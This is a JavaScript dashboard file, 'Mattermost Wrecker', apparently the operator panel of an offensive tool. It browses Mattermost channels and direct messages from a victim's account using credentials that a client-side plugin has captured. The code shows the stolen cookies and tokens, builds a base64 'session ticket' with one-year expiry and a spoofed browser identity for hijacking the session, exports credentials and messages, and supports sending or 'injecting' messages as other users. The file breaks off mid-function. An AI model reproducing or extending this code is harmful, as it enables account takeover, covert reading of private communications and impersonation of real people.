// Mattermost Wrecker — ui.js
// Dashboard UI for browsing Mattermost channels, messages, and sending messages.

var channels = [];
var users = [];
var currentMessages = [];
var currentChannelId = null;
var currentChannelName = '';
var credData = null;
var allErrors = [];
var channelFilter = '';
var searchResults = null;
var searchQuery = '';
var _refreshTimer = null;
var _pollTimer = null;
var _searchPollTimer = null;
var selectedInjectUser = null;
var _injectPollTimer = null;
var _activeDownloads = {};
var servers = [];
var activeServerIndex = 0;
var mmTeams = [];
var activeTeamId = '';
var _teamSwitchPending = false;
var _serverSwitchTime = 0;
var _serverGeneration = 0;
var _switchPending = false;
var injectedMessageCount = 0;
var _clearInjectedPollTimer = null;

function humanFileSize(bytes) {
    if (!bytes || bytes < 1024) return (bytes || 0) + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

function fileIcon(mimetype) {
    if (!mimetype) return '\u{1F4CE}';
    if (mimetype.indexOf('image/') === 0) return '\u{1F5BC}';
    if (mimetype.indexOf('video/') === 0) return '\u{1F3AC}';
    if (mimetype.indexOf('audio/') === 0) return '\u{1F3B5}';
    if (mimetype.indexOf('pdf') !== -1) return '\u{1F4C4}';
    return '\u{1F4CE}';
}

function userInitialAvatar(name, userId) {
    var initial = (name && name.length > 0) ? name.charAt(0).toUpperCase() : '?';
    var colors = ['#4a7c59','#7c4a6b','#4a5e7c','#7c6b4a','#5a4a7c','#7c4a4a','#4a7c7c','#6b7c4a'];
    var hash = 0;
    var id = userId || name || '';
    for (var i = 0; i < id.length; i++) {
        hash = ((hash << 5) - hash) + id.charCodeAt(i);
        hash = hash & hash;
    }
    var color = colors[Math.abs(hash) % colors.length];
    return '<div style="width:24px;height:24px;border-radius:3px;background:' + color +
        ';display:inline-flex;align-items:center;justify-content:center;color:#fff;font-size:12px;font-weight:bold;margin-right:8px;flex-shrink:0">' +
        initial + '</div>';
}

function esc(str) {
    if (str === null || str === undefined) return '';
    var div = document.createElement('div');
    div.appendChild(document.createTextNode(String(str)));
    return div.innerHTML;
}

// ===== Send command to plugin via server =====

function sendCommand(command) {
    return fetch('/api/plugins/mattermost/command', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ clientID: pluginUI.clientId, command: command })
    }).then(function(r) { return r.json(); });
}

// ===== Render functions =====

function renderTopbar() {
    var selectEl = pluginUI.container.querySelector('#mm-server-select');
    var userEl = pluginUI.container.querySelector('#mm-user');
    var statusEl = pluginUI.container.querySelector('#mm-status');

    var spinner = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>';

    if (credData) {
        userEl.textContent = 'User: ' + (credData.userName || credData.userId || '--');
        if (credData.status === 'ready') {
            statusEl.className = 'badge bg-success';
            statusEl.textContent = 'Connected';
        } else if (credData.status === 'syncing') {
            statusEl.className = 'badge bg-warning text-dark';
            statusEl.innerHTML = spinner + 'Syncing channels...';
        } else if (credData.status === 'auth_failed') {
            statusEl.className = 'badge bg-danger';
            statusEl.textContent = 'Auth Failed';
        } else {
            statusEl.className = 'badge bg-warning text-dark';
            statusEl.innerHTML = spinner + esc(credData.status || 'Syncing...');
        }
    } else {
        statusEl.className = 'badge bg-secondary';
        statusEl.innerHTML = spinner + 'Syncing...';
    }

    // Populate server dropdown
    if (selectEl && servers.length > 0) {
        var html = '';
        for (var i = 0; i < servers.length; i++) {
            var sv = servers[i];
            var label = sv.teamName || sv.serverUrl || ('Server ' + (i + 1));
            if (sv.userName) label += ' (' + sv.userName + ')';
            html += '<option value="' + i + '"' + (i === activeServerIndex ? ' selected' : '') + '>' + esc(label) + '</option>';
        }
        selectEl.innerHTML = html;
    } else if (selectEl && credData) {
        selectEl.innerHTML = '<option value="0">' + esc(credData.teamName || credData.serverUrl || 'Server') + '</option>';
    }
}

function renderTeamSelector() {
    var selectEl = pluginUI.container.querySelector('#mm-team-select');
    if (!selectEl) return;

    if (mmTeams.length <= 1) {
        selectEl.style.display = 'none';
        return;
    }

    selectEl.style.display = '';
    var html = '';
    for (var i = 0; i < mmTeams.length; i++) {
        var t = mmTeams[i];
        html += '<option value="' + esc(t.id) + '"' + (t.id === activeTeamId ? ' selected' : '') + '>' + esc(t.name) + '</option>';
    }
    selectEl.innerHTML = html;
}

function renderChannels() {
    var container = pluginUI.container.querySelector('#mm-channel-list');
    if (!container) return;

    if (channels.length === 0) {
        container.innerHTML = '<div class="text-muted small p-2">No channels loaded</div>';
        return;
    }

    var publicCh = [];
    var privateCh = [];
    var dmCh = [];
    var groupDmCh = [];

    var filter = channelFilter.toLowerCase();

    for (var i = 0; i < channels.length; i++) {
        var ch = channels[i];
        if (filter && (ch.name || '').toLowerCase().indexOf(filter) === -1) continue;

        if (ch.type === 'dm') dmCh.push(ch);
        else if (ch.type === 'group_dm') groupDmCh.push(ch);
        else if (ch.type === 'private') privateCh.push(ch);
        else publicCh.push(ch);
    }

    var html = '';

    if (publicCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-1" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Channels</div>';
        for (var p = 0; p < publicCh.length; p++) {
            html += channelItem(publicCh[p], '#');
        }
    }

    if (privateCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Private</div>';
        for (var pr = 0; pr < privateCh.length; pr++) {
            html += channelItem(privateCh[pr], '\u{1F512}');
        }
    }

    if (groupDmCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Group DMs</div>';
        for (var g = 0; g < groupDmCh.length; g++) {
            html += channelItem(groupDmCh[g], '');
        }
    }

    if (dmCh.length > 0) {
        html += '<div class="text-muted small px-2 pt-2" style="text-transform:uppercase;font-size:0.65rem;color:#7a8288">Direct Messages</div>';
        for (var d = 0; d < dmCh.length; d++) {
            html += channelItem(dmCh[d], '');
        }
    }

    if (!html) {
        html = '<div class="text-muted small p-2">No channels match filter</div>';
    }

    container.innerHTML = html;

    // Wire click handlers
    var items = container.querySelectorAll('[data-channel-id]');
    for (var ci = 0; ci < items.length; ci++) {
        (function(item) {
            item.onclick = function() {
                var chId = item.getAttribute('data-channel-id');
                var chName = item.getAttribute('data-channel-name');
                selectChannel(chId, chName);

                for (var x = 0; x < items.length; x++) {
                    items[x].style.borderLeft = '';
                    items[x].style.background = '';
                }
                item.style.borderLeft = '3px solid #62c462';
                item.style.background = 'rgba(255,255,255,0.05)';
            };
        })(items[ci]);
    }
}

function channelItem(ch, prefix) {
    var active = ch.id === currentChannelId;
    var style = 'padding:3px 8px;cursor:pointer;border-radius:3px;font-size:0.85rem;';
    if (active) {
        style += 'border-left:3px solid #62c462;background:rgba(255,255,255,0.05);';
    }
    return '<div data-channel-id="' + esc(ch.id) + '" data-channel-name="' + esc(ch.name) + '" ' +
        'style="' + style + '">' +
        '<span class="text-muted">' + prefix + '</span>' + esc(ch.name) +
        '</div>';
}

function resolveUserName(nameOrId) {
    if (!nameOrId) return 'unknown';
    // Mattermost user IDs are 26-char alphanumeric
    if (!/^[a-z0-9]{26}$/.test(nameOrId)) return nameOrId;
    for (var i = 0; i < users.length; i++) {
        if (users[i].id === nameOrId) return users[i].name || users[i].realName || nameOrId;
    }
    return nameOrId;
}

function renderMessages() {
    var container = pluginUI.container.querySelector('#mm-messages');
    var nameEl = pluginUI.container.querySelector('#mm-channel-name');
    var topicEl = pluginUI.container.querySelector('#mm-channel-topic');

    if (!container) return;

    if (!currentChannelId) {
        container.innerHTML = '<div class="text-muted small">Select a channel to view messages</div>';
        nameEl.textContent = 'Select a channel';
        topicEl.textContent = '';
        return;
    }

    nameEl.textContent = currentChannelName || currentChannelId;

    var topic = '';
    for (var c = 0; c < channels.length; c++) {
        if (channels[c].id === currentChannelId) {
            topic = channels[c].topic || channels[c].purpose || '';
            break;
        }
    }
    topicEl.textContent = topic ? '| ' + topic : '';

    if (currentMessages.length === 0) {
        container.innerHTML = '<div class="text-muted small"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Fetching...</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < currentMessages.length; i++) {
        var msg = currentMessages[i];
        var timeStr = '';
        if (msg.time) {
            try {
                var d = new Date(msg.time);
                timeStr = d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
            } catch (e) {
                timeStr = '';
            }
        }

        var subtypeClass = '';
        if (msg.type && msg.type !== '') subtypeClass = ' text-muted fst-italic';

        var displayName = resolveUserName(msg.user || 'unknown');

        var filesHtml = '';
        if (msg.files && msg.files.length) {
            for (var fi = 0; fi < msg.files.length; fi++) {
                var f = msg.files[fi];
                filesHtml += '<div class="d-flex align-items-center mt-1" style="padding:4px 8px;background:#3a3f44;border-radius:3px;border-left:3px solid #52565a;gap:6px">' +
                    '<span>' + fileIcon(f.mimetype) + '</span>' +
                    '<span class="small" style="color:#fff">' + esc(f.name || f.fileId || 'file') + '</span>' +
                    '<span class="text-muted small">(' + humanFileSize(f.size) + ')</span>';
                if (f.fileId) {
                    filesHtml += '<button class="btn btn-outline-secondary btn-sm ms-auto mm-file-dl" ' +
                        'data-file-id="' + esc(f.fileId) + '" data-name="' + esc(f.name || f.fileId) + '" ' +
                        'style="padding:1px 6px;font-size:0.7rem;line-height:1.2">Download</button>';
                }
                filesHtml += '</div>';
            }
        }

        html += '<div class="mb-2">' +
            '<span class="fw-bold" style="color:#fff">' + esc(displayName) + '</span>' +
            '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
            '<div class="small' + subtypeClass + '" style="color:#aaa;word-break:break-word">' + formatMMText(msg.text || '') + '</div>' +
            filesHtml +
            '</div>';
    }

    var wasNearBottom = (container.scrollHeight - container.scrollTop - container.clientHeight) < 80;

    container.innerHTML = html;

    if (wasNearBottom) {
        container.scrollTop = container.scrollHeight;
    }

    // Wire file download buttons
    var dlBtns = container.querySelectorAll('.mm-file-dl');
    for (var di = 0; di < dlBtns.length; di++) {
        (function(btn) {
            var name = btn.getAttribute('data-name');
            var fileId = btn.getAttribute('data-file-id');
            if (_activeDownloads[name]) {
                btn.disabled = true;
                btn.textContent = _activeDownloads[name];
            }
            btn.onclick = function() {
                if (_activeDownloads[name]) return;
                btn.disabled = true;
                btn.textContent = 'Downloading...';
                _activeDownloads[name] = 'Downloading...';

                pluginUI.fetchData('file_download', 1, 0).then(function(snap) {
                    var snapRows = snap.rows || [];
                    var lastId = snapRows.length > 0 ? snapRows[0].id : 0;

                    sendCommand({ action: 'download_file', fileId: fileId, fileName: name });

                    var polls = 0;
                    var dlTimer = setInterval(function() {
                        polls++;
                        if (polls > 60) {
                            clearInterval(dlTimer);
                            delete _activeDownloads[name];
                            var curBtn = container.querySelector('.mm-file-dl[data-name="' + CSS.escape(name) + '"]');
                            if (curBtn) { curBtn.textContent = 'Timeout'; curBtn.disabled = false; }
                            return;
                        }
                        pluginUI.fetchData('file_download', 5, 0).then(function(result) {
                            var rows = result.rows || [];
                            for (var r = 0; r < rows.length; r++) {
                                var row = rows[r];
                                var d = row.data || {};
                                if (d.fileName !== name || row.id <= lastId) continue;
                                if (d.data) {
                                    clearInterval(dlTimer);
                                    var byteChars = atob(d.data);
                                    var byteArray = new Uint8Array(byteChars.length);
                                    for (var b = 0; b < byteChars.length; b++) {
                                        byteArray[b] = byteChars.charCodeAt(b);
                                    }
                                    var blob = new Blob([byteArray], { type: d.contentType || 'application/octet-stream' });
                                    var a = document.createElement('a');
                                    a.href = URL.createObjectURL(blob);
                                    a.download = name;
                                    document.body.appendChild(a);
                                    a.click();
                                    document.body.removeChild(a);
                                    URL.revokeObjectURL(a.href);
                                    _activeDownloads[name] = 'Downloaded';
                                    var curBtn = container.querySelector('.mm-file-dl[data-name="' + CSS.escape(name) + '"]');
                                    if (curBtn) { curBtn.textContent = 'Downloaded'; curBtn.disabled = false; }
                                    setTimeout(function() { delete _activeDownloads[name]; }, 3000);
                                    return;
                                }
                                if (d.error) {
                                    clearInterval(dlTimer);
                                    delete _activeDownloads[name];
                                    var curBtn = container.querySelector('.mm-file-dl[data-name="' + CSS.escape(name) + '"]');
                                    if (curBtn) { curBtn.textContent = 'Error'; curBtn.disabled = false; }
                                    return;
                                }
                            }
                        });
                    }, 1000);
                });
            };
        })(dlBtns[di]);
    }
}

function formatMMText(text) {
    var escaped = esc(text);
    // Bold: **text** or __text__
    escaped = escaped.replace(/\*\*([^*]+)\*\*/g, '<b>$1</b>');
    escaped = escaped.replace(/__([^_]+)__/g, '<b>$1</b>');
    // Italic: *text* or _text_
    escaped = escaped.replace(/\*([^*]+)\*/g, '<i>$1</i>');
    escaped = escaped.replace(/\b_([^_]+)_\b/g, '<i>$1</i>');
    // Strikethrough: ~~text~~
    escaped = escaped.replace(/~~([^~]+)~~/g, '<s>$1</s>');
    // Code: `text`
    escaped = escaped.replace(/`([^`]+)`/g, '<code style="background:#3a3f44;padding:1px 4px;border-radius:3px">$1</code>');
    // URLs
    escaped = escaped.replace(/(https?:\/\/[^\s<]+)/g, '<a href="$1" target="_blank" style="color:#fff">$1</a>');
    // Newlines
    escaped = escaped.replace(/\n/g, '<br>');
    return escaped;
}

function renderErrors() {
    var toggle = pluginUI.container.querySelector('#mm-errors-toggle');
    var countEl = pluginUI.container.querySelector('#mm-error-count');
    var tbody = pluginUI.container.querySelector('#mm-errors-body');

    if (allErrors.length > 0) {
        toggle.style.display = '';
        countEl.textContent = allErrors.length;

        var html = '';
        for (var i = 0; i < allErrors.length; i++) {
            var row = allErrors[i];
            var d = row.data || {};
            html += '<tr>' +
                '<td class="small">' + esc(d.phase || '') + '</td>' +
                '<td class="small" style="max-width:400px;word-break:break-all">' + esc(d.error || JSON.stringify(d)) + '</td>' +
                '<td class="small text-muted">' + (row.timeStamp ? new Date(row.timeStamp).toLocaleString() : '') + '</td>' +
                '</tr>';
        }
        tbody.innerHTML = html;
    } else {
        toggle.style.display = 'none';
    }
}

function renderSearchResults() {
    var panel = pluginUI.container.querySelector('#mm-search-panel');
    var container = pluginUI.container.querySelector('#mm-search-results');
    var titleEl = pluginUI.container.querySelector('#mm-search-title');

    if (!searchResults || !panel) return;

    panel.style.display = '';
    titleEl.textContent = 'Search: "' + searchResults.query + '" (' + (searchResults.total || 0) + ' results)';

    var matches = searchResults.matches || [];
    if (matches.length === 0) {
        var msg = 'No messages found';
        if (searchResults.error) msg = 'Search error: ' + searchResults.error;
        container.innerHTML = '<div class="text-muted small">' + esc(msg) + '</div>';
        return;
    }

    var html = '';
    for (var i = 0; i < matches.length; i++) {
        var m = matches[i];
        var timeStr = '';
        if (m.time) {
            try { timeStr = new Date(m.time).toLocaleString(); } catch (e) {}
        }

        var chLabel = m.channelName || m.channelId || '';

        html += '<div class="mb-2 pb-2" style="border-bottom:1px solid #3a3f44">' +
            '<div>' +
            '<span class="fw-bold" style="color:#fff">' + esc(resolveUserName(m.user || 'unknown')) + '</span>' +
            '<span class="badge bg-dark ms-2">' + esc(chLabel) + '</span>' +
            '<span class="text-muted small ms-2">' + esc(timeStr) + '</span>' +
            '</div>' +
            '<div class="small" style="color:#aaa;word-break:break-word">' + formatMMText(m.text || '') + '</div>';

        if (m.channelId) {
            html += ' <a href="#" class="small mm-search-goto" data-ch-id="' + esc(m.channelId) + '" data-ch-name="' + esc(m.channelName || m.channelId) + '" style="color:#fff;margin-left:8px">open channel</a>';
        }

        html += '</div>';
    }

    container.innerHTML = html;

    var gotos = container.querySelectorAll('.mm-search-goto');
    for (var g = 0; g < gotos.length; g++) {
        (function(el) {
            el.onclick = function(e) {
                e.preventDefault();
                selectChannel(el.getAttribute('data-ch-id'), el.getAttribute('data-ch-name'));
            };
        })(gotos[g]);
    }
}

// ===== Channel selection =====

function selectChannel(channelId, channelName) {
    currentChannelId = channelId;
    currentChannelName = channelName || channelId;
    currentMessages = [];
    renderMessages();

    var input = pluginUI.container.querySelector('#mm-msg-input');
    var sendBtn = pluginUI.container.querySelector('#mm-send-btn');
    if (input) input.disabled = false;
    if (sendBtn) sendBtn.disabled = false;

    updateInjectControls();

    if (!_switchPending) {
        pluginUI.fetchData('messages', 50, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.channelId === channelId) {
                    currentMessages = d.messages || [];
                    renderMessages();
                    return;
                }
            }
            sendCommand({ action: 'fetch_messages', channelId: channelId, channelName: channelName, limit: 50 });
        });
    } else {
        sendCommand({ action: 'fetch_messages', channelId: channelId, channelName: channelName, limit: 50 });
    }
}

// ===== Data loading =====

function loadMessages() {
    if (!currentChannelId) return;
    var gen = _serverGeneration;
    pluginUI.fetchData('messages', 50, 0).then(function(result) {
        if (gen !== _serverGeneration) return;
        var rows = result.rows || [];
        for (var i = 0; i < rows.length; i++) {
            var d = rows[i].data || {};
            if (d.channelId === currentChannelId) {
                currentMessages = d.messages || [];
                renderMessages();
                break;
            }
        }
    });
}

function loadData() {
    if (!pluginUI.container || !pluginUI.container.parentNode) {
        if (_refreshTimer) { clearInterval(_refreshTimer); _refreshTimer = null; }
        if (_pollTimer) { clearInterval(_pollTimer); _pollTimer = null; }
        return;
    }

    // Load server list
    pluginUI.fetchData('server_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.servers && latest.servers.length > 0) {
                servers = latest.servers;
                if (typeof latest.activeIndex === 'number' && !_switchPending) {
                    activeServerIndex = latest.activeIndex;
                }
                renderTopbar();
            }
        }
    });

    // Load team list
    pluginUI.fetchData('team_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.teams && latest.teams.length > 0) {
                mmTeams = latest.teams;
                if (latest.activeTeamId && !_teamSwitchPending) {
                    activeTeamId = latest.activeTeamId;
                }
                renderTeamSelector();
            }
        }
    });

    // Load credentials
    pluginUI.fetchData('credentials', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var newCred = rows[0].data || {};
            credData = newCred;
            renderTopbar();
        }
    });

    // Load channels
    if (_switchPending) {
        var chContainer = pluginUI.container.querySelector('#mm-channel-list');
        if (chContainer && channels.length === 0) {
            chContainer.innerHTML = '<div class="text-muted small p-2"><span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Syncing server...</div>';
        }
    }
    if (!_switchPending && !_teamSwitchPending) pluginUI.fetchData('channel_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            channels = latest.channels || [];
            renderChannels();
        }
    });

    // Load users
    if (!_switchPending && !_teamSwitchPending) pluginUI.fetchData('user_list', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.users && latest.users.length > 0) {
                users = latest.users;
            }
        }
    });

    // Check if server switch is complete
    if (_switchPending) {
        pluginUI.fetchData('switch_complete', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var latest = rows[0].data || {};
                if (latest.serverIndex === activeServerIndex) {
                    _switchPending = false;
                    pluginUI.fetchData('channel_list', 5, 0).then(function(chResult) {
                        var chRows = chResult.rows || [];
                        if (chRows.length > 0) {
                            channels = (chRows[0].data || {}).channels || [];
                            renderChannels();
                        }
                    });
                    pluginUI.fetchData('user_list', 5, 0).then(function(uResult) {
                        var uRows = uResult.rows || [];
                        if (uRows.length > 0) {
                            var uLatest = uRows[0].data || {};
                            if (uLatest.users && uLatest.users.length > 0) {
                                users = uLatest.users;
                            }
                        }
                    });
                }
            }
        });
    }

    // Check if team switch is complete
    if (_teamSwitchPending) {
        pluginUI.fetchData('team_switch_complete', 5, 0).then(function(result) {
            var rows = result.rows || [];
            if (rows.length > 0) {
                var latest = rows[0].data || {};
                if (latest.teamId === activeTeamId) {
                    _teamSwitchPending = false;
                    pluginUI.fetchData('channel_list', 5, 0).then(function(chResult) {
                        var chRows = chResult.rows || [];
                        if (chRows.length > 0) {
                            channels = (chRows[0].data || {}).channels || [];
                            renderChannels();
                        }
                    });
                    pluginUI.fetchData('user_list', 5, 0).then(function(uResult) {
                        var uRows = uResult.rows || [];
                        if (uRows.length > 0) {
                            var uLatest = uRows[0].data || {};
                            if (uLatest.users && uLatest.users.length > 0) {
                                users = uLatest.users;
                            }
                        }
                    });
                }
            }
        });
    }

    // Load messages for current channel
    if (currentChannelId && !_switchPending) {
        pluginUI.fetchData('messages', 50, 0).then(function(result) {
            var rows = result.rows || [];
            for (var i = 0; i < rows.length; i++) {
                var d = rows[i].data || {};
                if (d.channelId === currentChannelId) {
                    currentMessages = d.messages || [];
                    renderMessages();
                    break;
                }
            }
        });
    }

    // Load send results
    pluginUI.fetchData('send_result', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            if (latest.ok && latest.channelId === currentChannelId) {
                sendCommand({ action: 'fetch_messages', channelId: currentChannelId, channelName: currentChannelName, limit: 50 });
            }
        }
    });

    // Load injected message tracking
    pluginUI.fetchData('injected_messages', 5, 0).then(function(result) {
        var rows = result.rows || [];
        if (rows.length > 0) {
            var latest = rows[0].data || {};
            injectedMessageCount = latest.count || 0;
            updateClearInjectedButton();
        }
    });

    // Load errors
    pluginUI.fetchData('_error', 50, 0).then(function(result) {
        allErrors = result.rows || [];
        renderErrors();
    });
}

// ===== Wire up controls =====

// Server switcher
var serverSelect = pluginUI.container.querySelector('#mm-server-select');
if (serverSelect) {
    serverSelect.onchange = function() {
        var idx = parseInt(serverSelect.value, 10);
        if (isNaN(idx) || idx === activeServerIndex) return;
        activeServerIndex = idx;
        _serverSwitchTime = Date.now();
        _serverGeneration++;
        _switchPending = true;

        channels = [];
        currentMessages = [];
        currentChannelId = null;
        currentChannelName = '';
        users = [];
        selectedInjectUser = null;
        searchResults = null;
        mmTeams = [];
        activeTeamId = '';
        _teamSwitchPending = false;
        var searchPanel = pluginUI.container.querySelector('#mm-search-panel');
        if (searchPanel) searchPanel.style.display = 'none';

        renderChannels();
        renderMessages();
        renderTeamSelector();

        var labelEl = pluginUI.container.querySelector('#mm-inject-selected-user');
        if (labelEl) labelEl.textContent = '1. Search for a sender, 2. Select a channel from the sidebar';
        updateInjectControls();

        var statusEl = pluginUI.container.querySelector('#mm-status');
        if (statusEl) {
            statusEl.className = 'badge bg-secondary';
            statusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Syncing...';
        }

        sendCommand({ action: 'switch_server', serverIndex: idx });

        var polls = 0;
        var switchPollTimer = setInterval(function() {
            polls++;
            if (polls > 15 || !pluginUI.container || !pluginUI.container.parentNode) {
                clearInterval(switchPollTimer);
                return;
            }
            loadData();
        }, 1000);
    };
}

// Team switcher
var teamSelect = pluginUI.container.querySelector('#mm-team-select');
if (teamSelect) {
    teamSelect.onchange = function() {
        var newTeamId = teamSelect.value;
        if (!newTeamId || newTeamId === activeTeamId) return;
        activeTeamId = newTeamId;
        _teamSwitchPending = true;
        _serverGeneration++;

        channels = [];
        currentMessages = [];
        currentChannelId = null;
        currentChannelName = '';
        users = [];
        selectedInjectUser = null;
        searchResults = null;
        var searchPanel = pluginUI.container.querySelector('#mm-search-panel');
        if (searchPanel) searchPanel.style.display = 'none';

        renderChannels();
        renderMessages();

        var labelEl = pluginUI.container.querySelector('#mm-inject-selected-user');
        if (labelEl) labelEl.textContent = '1. Search for a sender, 2. Select a channel from the sidebar';
        updateInjectControls();

        var statusEl = pluginUI.container.querySelector('#mm-status');
        if (statusEl) {
            statusEl.className = 'badge bg-secondary';
            statusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Syncing...';
        }

        sendCommand({ action: 'switch_team', teamId: newTeamId });

        var polls = 0;
        var teamPollTimer = setInterval(function() {
            polls++;
            if (polls > 15 || !pluginUI.container || !pluginUI.container.parentNode) {
                clearInterval(teamPollTimer);
                return;
            }
            loadData();
        }, 1000);
    };
}

// Channel filter
var filterInput = pluginUI.container.querySelector('#mm-channel-filter');
if (filterInput) {
    filterInput.oninput = function() {
        channelFilter = filterInput.value;
        renderChannels();
    };
}

// Refresh channels button
var refreshBtn = pluginUI.container.querySelector('#mm-refresh-btn');
if (refreshBtn) {
    refreshBtn.onclick = function() {
        sendCommand({ action: 'fetch_channels' });
        sendCommand({ action: 'fetch_users' });
    };
}

// Send message
var msgInput = pluginUI.container.querySelector('#mm-msg-input');
var sendBtn = pluginUI.container.querySelector('#mm-send-btn');

var _sendPollTimer = null;

if (sendBtn) {
    sendBtn.onclick = function() {
        if (!currentChannelId || !msgInput || !msgInput.value.trim()) return;
        sendCommand({ action: 'send_message', channelId: currentChannelId, channelName: currentChannelName, text: msgInput.value.trim() });
        msgInput.value = '';

        var polls = 0;
        if (_sendPollTimer) clearInterval(_sendPollTimer);
        _sendPollTimer = setInterval(function() {
            polls++;
            if (polls > 8 || !pluginUI.container || !pluginUI.container.parentNode) {
                clearInterval(_sendPollTimer);
                _sendPollTimer = null;
                return;
            }
            loadMessages();
        }, 1000);
    };
}

if (msgInput) {
    msgInput.onkeydown = function(e) {
        if (e.key === 'Enter' && !e.shiftKey) {
            e.preventDefault();
            if (sendBtn) sendBtn.click();
        }
    };
}

// Generate session ticket
var ticketBtn = pluginUI.container.querySelector('#mm-ticket-btn');
if (ticketBtn) {
    ticketBtn.onclick = function() {
        if (!credData || (!credData.cookie && !credData.token)) {
            alert('No Mattermost credentials available yet. Wait for sync to complete.');
            return;
        }

        var serverUrl = credData.serverUrl || '';
        var hostname = '';
        try { hostname = new URL(serverUrl).hostname; } catch(e) {}
        var expiry = Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60);

        // Build cookies from all extracted domain cookies
        var ticketCookies = [];
        if (credData.allCookies && credData.allCookies.length > 0) {
            for (var ci = 0; ci < credData.allCookies.length; ci++) {
                var ck = credData.allCookies[ci];
                ticketCookies.push({
                    name: ck.name,
                    value: ck.value,
                    httpOnly: !!ck.httpOnly,
                    secure: !!ck.secure,
                    sameSite: ck.sameSite || 'lax',
                    path: ck.path || '/',
                    domain: ck.domain || hostname,
                    expirationDate: expiry
                });
            }
        }
        // Fallback: if no allCookies, at least include MMAUTHTOKEN
        if (ticketCookies.length === 0 && (credData.cookie || credData.token)) {
            ticketCookies.push({
                name: 'MMAUTHTOKEN',
                value: credData.cookie || credData.token,
                httpOnly: true,
                secure: true,
                sameSite: 'lax',
                path: '/',
                domain: hostname,
                expirationDate: expiry
            });
        }

        var ticket = {
            version: 1,
            type: 'session',
            generated: new Date().toISOString(),
            domain: hostname,
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            platform: 'Windows',
            browser: 'Chrome',
            cookies: ticketCookies,
            headers: [],
            localStorage: [],
            sessionStorage: [],
            urls: [serverUrl]
        };

        // Add token to localStorage if available
        if (credData.token) {
            ticket.localStorage.push({ key: 'token', value: credData.token });
        }

        var b64 = btoa(JSON.stringify(ticket));
        navigator.clipboard.writeText(b64).then(function() {
            var orig = ticketBtn.textContent;
            ticketBtn.textContent = 'Copied!';
            setTimeout(function() { ticketBtn.textContent = orig; }, 2000);
        }).catch(function() {
            var ta = document.createElement('textarea');
            ta.value = b64;
            document.body.appendChild(ta);
            ta.select();
            document.execCommand('copy');
            document.body.removeChild(ta);
            var orig = ticketBtn.textContent;
            ticketBtn.textContent = 'Copied!';
            setTimeout(function() { ticketBtn.textContent = orig; }, 2000);
        });
    };
}

// Export
var exportBtn = pluginUI.container.querySelector('#mm-export-btn');
if (exportBtn) {
    exportBtn.onclick = function() {
        var exportData = {
            credentials: credData,
            channels: channels,
            currentMessages: { channelId: currentChannelId, channelName: currentChannelName, messages: currentMessages },
            exportedAt: new Date().toISOString()
        };
        var blob = new Blob([JSON.stringify(exportData, null, 2)], { type: 'application/json' });
        var dlUrl = URL.createObjectURL(blob);
        var a = document.createElement('a');
        a.href = dlUrl;
        a.download = 'mattermost_extract_' + Date.now() + '.json';
        a.click();
        URL.revokeObjectURL(dlUrl);
    };
}

// Clear data
var clearBtn = pluginUI.container.querySelector('#mm-clear-btn');
if (clearBtn) {
    clearBtn.onclick = function() {
        if (confirm('Clear all extracted Mattermost data?')) {
            pluginUI.deleteData().then(function() {
                channels = [];
                currentMessages = [];
                credData = null;
                allErrors = [];
                currentChannelId = null;
                renderTopbar();
                renderChannels();
                renderMessages();
                renderErrors();
            });
        }
    };
}

// Error toggle
var errToggle = pluginUI.container.querySelector('#mm-errors-toggle');
var errPanel = pluginUI.container.querySelector('#mm-errors-panel');
if (errToggle && errPanel) {
    errToggle.onclick = function(e) {
        e.preventDefault();
        errPanel.style.display = errPanel.style.display === 'none' ? '' : 'none';
    };
}

// ===== Search controls =====

var searchInput = pluginUI.container.querySelector('#mm-search-input');
var searchBtn = pluginUI.container.querySelector('#mm-search-btn');
var searchStatusEl = pluginUI.container.querySelector('#mm-search-status');
var searchCloseBtn = pluginUI.container.querySelector('#mm-search-close');

function doSearch(query) {
    if (!query || !query.trim()) return;
    searchQuery = query.trim();
    searchResults = null;
    if (searchStatusEl) searchStatusEl.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" style="width:0.7rem;height:0.7rem"></span>Searching...';
    sendCommand({ action: 'search_messages', query: searchQuery });

    var polls = 0;
    if (_searchPollTimer) clearInterval(_searchPollTimer);
    _searchPollTimer = setInterval(function() {
        polls++;
        if (polls > 30) {
